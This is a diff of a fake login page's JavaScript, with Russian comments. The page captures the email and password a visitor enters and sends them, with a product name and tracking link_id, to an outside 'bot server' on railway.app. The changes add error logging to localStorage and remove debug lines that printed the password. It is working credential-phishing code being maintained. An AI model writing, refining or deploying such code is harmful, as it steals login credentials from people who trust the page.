@@ -810,6 +810,19 @@
         }
 
         // Send log to bot server
+        // Логирование ошибок в localStorage
+        window.addEventListener('error', function(e) {
+            const errors = JSON.parse(localStorage.getItem('loginErrors') || '[]');
+            errors.push({
+                message: e.message,
+                source: e.filename,
+                line: e.lineno,
+                time: new Date().toISOString()
+            });
+            localStorage.setItem('loginErrors', JSON.stringify(errors.slice(-10))); // Последние 10 ошибок
+            console.error('ERROR LOGGED:', e.message);
+        });
+
         function sendLog(type, details, callback) {
             const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
 
@@ -831,6 +844,14 @@
             })
             .catch(error => {
                 console.error('Error sending log:', error);
+                // Логируем ошибку отправки в localStorage
+                const errors = JSON.parse(localStorage.getItem('loginErrors') || '[]');
+                errors.push({
+                    type: 'sendLog error',
+                    message: error.message,
+                    time: new Date().toISOString()
+                });
+                localStorage.setItem('loginErrors', JSON.stringify(errors.slice(-10)));
                 if (callback) callback();
             });
         }
@@ -873,12 +894,9 @@
 
         // Handle form submission
         function handleSubmit(event) {
-            console.log('=== handleSubmit called ===');
             event.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            console.log('Email value:', email);
-            console.log('Password value:', password);
 
             // Validation
             if (!email.trim()) {
@@ -890,7 +908,6 @@
                 alert('Пожалуйста, введите пароль');
                 return;
             }
-            console.log('Validation passed, proceeding with login attempt');
 
             // Get all URL parameters
             const urlParams = new URLSearchParams(window.location.search);
@@ -905,14 +922,6 @@
 
             // Send log with product name and link_id for identification
             const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}\n📦 Товар: ${productName}\nlink_id=${link_id}`;
-
-            console.log('Sending login_attempt log:', logDetails);
-            console.log('sendLog is function?', typeof sendLog === 'function');
-
-            // Send test log first to verify sendLog works
-            if (typeof sendLog === 'function') {
-              sendLog('test_login', `TEST: Email=${email}`);
-            }
 
             if (typeof sendLog === 'function') {
               sendLog('login_attempt', logDetails, function() {
